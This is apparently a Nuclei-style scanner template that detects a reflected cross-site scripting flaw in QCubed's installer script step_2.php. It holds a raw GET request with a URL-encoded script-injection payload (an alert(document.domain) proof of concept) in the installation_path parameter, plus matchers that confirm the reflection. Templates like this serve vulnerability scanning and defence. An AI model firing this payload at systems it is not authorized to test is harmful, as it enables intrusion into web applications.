id: qcubed-xss2
info:
  author: pikpikcu
  name: Qcubed Reflected XSS
  reference: https://github.com/qcubed/qcubed/issues/1230
  severity: medium
  tags: xss,qcubed
requests:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'GET /qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Connection: close

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
    (KHTML, like Gecko)

    '
